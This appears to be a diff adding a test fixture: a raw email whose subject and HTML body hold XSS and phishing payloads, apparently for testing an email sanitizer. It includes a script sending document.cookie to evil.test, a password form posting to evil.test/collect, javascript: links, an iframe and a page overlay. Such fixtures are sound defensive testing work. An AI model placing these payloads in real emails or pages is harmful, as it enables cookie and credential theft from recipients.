@@ -1,0 +1,20 @@
+From: Attacker <attacker@evil.test>
+To: k7f2m9x3qz@phenk.test
+Subject: <script>alert(1)</script> and a =?utf-8?q?=00?= null
+Date: Mon, 09 Jan 2006 13:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<script>fetch('https://evil.test/?c='+document.cookie)</script>
+<img src="https://tracker.evil.test/pixel.gif?id=victim" width="1" height="1" onerror="alert(1)">
+<a href="javascript:alert(document.domain)">Click here</a>
+<a href="https://phishing.evil.test/login">Sign in to your account</a>
+<form action="https://evil.test/collect" method="post"><input name="password" type="password"></form>
+<iframe src="https://evil.test/"></iframe>
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999">
+  Full page overlay
+</div>
+<svg><script>alert(2)</script></svg>
+<p>Your code is 314159.</p>
+</body></html>
